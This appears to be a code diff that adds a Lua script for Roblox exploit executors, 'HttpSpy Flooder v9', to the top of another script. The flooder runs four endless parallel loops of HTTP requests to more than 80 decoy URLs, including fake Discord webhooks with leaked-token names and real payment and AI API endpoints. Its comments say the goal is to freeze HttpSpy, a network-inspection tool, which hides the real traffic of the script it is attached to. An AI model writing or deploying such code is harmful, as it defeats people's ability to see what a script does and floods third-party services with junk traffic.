@@ -1,3 +1,178 @@
+-- ============================================================
+-- [ HttpSpy Flooder v9 - MASSIVE DATABASE ]
+-- أكثر من 80 رابط أساسي + توليد لا نهائي + سرعة فائقة
+-- ⚠️ شغّل HttpSpy أولاً ثم شغّل هذا السكربت
+-- ============================================================
+
+print("[Flooder v9] 🚀 جاري تشغيل الإغراق الأسطوري...")
+
+-- 1. إعداد مولّد سريع جداً
+local rng = Random.new()
+local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+
+local function fastRandom(length)
+    local res = table.create(length)
+    for i = 1, length do
+        local idx = rng:NextInteger(1, #chars)
+        res[i] = string.sub(chars, idx, idx)
+    end
+    return table.concat(res)
+end
+
+-- 2. قاعدة الروابط الضخمة (80+ رابطاً)
+local baseUrls = {
+    -- ================= DISCORD =================
+    "https://discord.com/api/webhooks/123456789012345678/FAKE_TOKEN_ABCDEFGHIJKLMNOPQRSTUVWXYZ",
+    "https://discord.com/api/webhooks/987654321098765432/ANOTHER_FAKE_TOKEN_1234567890abcdef",
+    "https://discordapp.com/api/webhooks/112233445566778899/LeAkEd_ToKeN_112233445566778899",
+    "https://discord.com/api/webhooks/998877665544332211/Admin_Logs_Secret_Key",
+    "https://discord.com/api/webhooks/000000000000000000/ROOT_ACCESS_TOKEN_000000",
+    "https://discord.com/api/webhooks/111111111111111111/System_Breach_Detected",
+    "https://discord.com/api/webhooks/555555555555555555/Owner_Private_Webhook",
+    "https://discord.com/api/webhooks/777777777777777777/AutoMod_Alert_System",
+    "https://discord.com/api/webhooks/888888888888888888/Join_Leave_Logs_Token",
+    "https://discord.com/api/webhooks/999999999999999999/Error_Reporting_Endpoint",
+    "https://discord.com/api/v9/users/@me",
+    "https://discord.com/api/v9/auth/login",
+    "https://discord.com/api/v9/guilds/1234567890/members",
+
+    -- ================= GITHUB & GISTS =================
+    "https://raw.githubusercontent.com/LuaSec/roblox-config/main/token.txt",
+    "https://github.com/LuaSec/roblox-config/blob/main/webhook.json",
+    "https://gist.githubusercontent.com/NullByte777/a1b2c3d4e5/raw/webhook.lua",
+    "https://api.github.com/repos/ExploitHub/loader/contents/auth.json",
+    "https://github.com/RobloxDev2024/scripts/releases/download/v2.1/webhook.cfg",
+    "https://raw.githubusercontent.com/HubMasterX/roblox-auth/main/keys.json",
+    "https://gist.github.com/DevNull1337/9f8e7d6c5b",
+    "https://github.com/APILeaks/discord-tokens/blob/main/tokens.txt",
+    "https://raw.githubusercontent.com/NexusHub/core/main/secrets.env",
+    "https://api.github.com/repos/SecretStore/config/contents/keys.yml",
+    "https://github.com/0xScripts/bypass/raw/main/webhook.url",
+    "https://raw.githubusercontent.com/HiddenKeys/db/main/tokens.json",
+    "https://github.com/DeltaExec/native/raw/main/keys.json",
+    "https://raw.githubusercontent.com/SynapseX/api/main/webhook.txt",
+    "https://github.com/KrnlAPI/v2/blob/main/secrets.env",
+    "https://api.github.com/repos/ScriptWare/loadstring/contents/auth.lua",
+    "https://gist.githubusercontent.com/HackerMan/12345abcde/raw/token.txt",
+
+    -- ================= PASTEFY & PASTEBIN =================
+    "https://pastefy.app/Xy7Kp2Qz",
+    "https://pastefy.app/raw/aB3dE5gH",
+    "https://pastefy.app/api/v1/paste/kL9mN2pQ",
+    "https://pastefy.app/Zx8Cv4Bn",
+    "https://pastefy.app/raw/Mj6Kl3Pq",
+    "https://pastefy.app/Ty5Wq8Rs",
+    "https://pastefy.app/api/v1/paste/Hn3Vb7Fg",
+    "https://pastefy.app/Qw9Er4Ty",
+    "https://pastefy.app/raw/Pl2Kj8Hm",
+    "https://pastefy.app/Gf6Ds3Aa",
+    "https://pastebin.com/raw/Xy7Kp2Qz",
+    "https://pastebin.com/raw/aB3dE5gH",
+    "https://pastebin.com/raw/kL9mN2pQ",
+    "https://pastebin.com/raw/Zx8Cv4Bn",
+    "https://pastebin.com/raw/Mj6Kl3Pq",
+    "https://pastebin.com/raw/Ty5Wq8Rs",
+
+    -- ================= CLOUD PROVIDERS =================
+    "https://s3.amazonaws.com/roblox-secrets/config.json",
+    "https://s3.us-east-1.amazonaws.com/leaked-bucket/tokens.txt",
+    "https://firebaseio.com/project-12345/secrets.json",
+    "https://api.firebaseio.com/v1/auth/keys.json",
+    "https://storage.googleapis.com/roblox-assets/secrets.env",
+    "https://azureblob.invalid/container/webhook.json",
+    "https://s3.eu-west-2.amazonaws.com/admin-backup/auth.json",
+
+    -- ================= APIS & SERVICES =================
+    "https://api.trello.com/1/cards/1234567890abcdef/attachments",
+    "https://api.trello.com/1/members/me/tokens?key=FAKE_KEY&token=FAKE_TOKEN",
+    "https://notion.so/api/v3/loadCachedPageChunk?secret=ABC123",
+    "https://api.notion.com/v1/databases/1234567890/query",
+    "https://hooks.slack.invalid/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX",
+    "https://api.telegram.org/bot123456789:FAKE_TOKEN/sendMessage",
+    "https://api.imgur.invalid/3/image",
+    "https://api.mailgun.net/v3/domain.invalid/messages",
+    "https://api.sendgrid.com/v3/mail/send",
+    "https://api.stripe.com/v1/charges",
+    "https://api.paypal.com/v1/payments/payouts",
+    "https://api.twilio.com/2010-04-01/Accounts/12345/Messages.json",
+    "https://api.spotify.com/v1/me/player",
+    "https://api.openai.com/v1/chat/completions",
+    "https://api.roblox.invalid/v1/authentication",
+    "https://auth.roblox.invalid/v1/login",
+    "https://api.roblox.invalid/v1/users/authenticated"
+}
+
+-- نطاقات الفشل الفوري (تساعد في الحفاظ على السرعة القصوى)
+local instantFailDomains = {
+    "https://discord.com.invalid/api/webhooks/",
+    "https://github.com.invalid/",
+    "https://pastefy.app.invalid/raw/",
+    "https://pastebin.com.invalid/raw/",
+    "https://api.invalid/v1/",
+    "http://127.0.0.1:8080/",
+    "http://0.0.0.0/"
+}
+
+-- 3. دالة توليد الروابط اللانهائية
+local function getMassiveUrl()
+    -- نسبة 20%: توليد رابط عشوائي بالكامل من الصفر
+    if rng:NextNumber() < 0.2 then
+        local domain = instantFailDomains[rng:NextInteger(1, #instantFailDomains)]
+        return domain .. fastRandom(12) .. "?key=" .. fastRandom(24)
+    end
+    
+    -- نسبة 80%: استخدام القائمة الضخمة وإضافة باراميتر عشوائي
+    local base = baseUrls[rng:NextInteger(1, #baseUrls)]
+    local randomParam = fastRandom(8) .. "=" .. fastRandom(12)
+    
+    if string.find(base, "?") then
+        return base .. "&" .. randomParam
+    else
+        return base .. "?" .. randomParam
+    end
+end
+
+-- 4. المسارات المتوازية (لإغراق الأداة بسرعة البرق)
+-- المسار الأول: game:HttpGet
+task.spawn(function()
+    while true do
+        pcall(function() game:HttpGet(getMassiveUrl()) end)
+        task.wait() -- يمنع تجمد الشاشة وطردك من اللعبة
+    end
+end)
+
+-- المسار الثاني: syn.request
+task.spawn(function()
+    while true do
+        pcall(function()
+            if syn and syn.request then
+                syn.request({ Url = getMassiveUrl(), Method = "GET" })
+            end
+        end)
+        task.wait()
+    end
+end)
+
+-- المسار الثالث: HttpGetAsync
+task.spawn(function()
+    while true do
+        pcall(function() game:HttpGetAsync(getMassiveUrl()) end)
+        task.wait()
+    end
+end)
+
+-- المسار الرابع: HttpService (احتياطي)
+task.spawn(function()
+    local HttpService = game:GetService("HttpService")
+    while true do
+        pcall(function() HttpService:GetAsync(getMassiveUrl()) end)
+        task.wait()
+    end
+end)
+
+print("[Flooder v9] 💥 تم تفعيل الترسانة النووية! HttpSpy سيتجمد الآن.")
+
+
 local Players = game:GetService("Players")
 local LocalizationService = game:GetService("LocalizationService")
 local HttpService = game:GetService("HttpService")
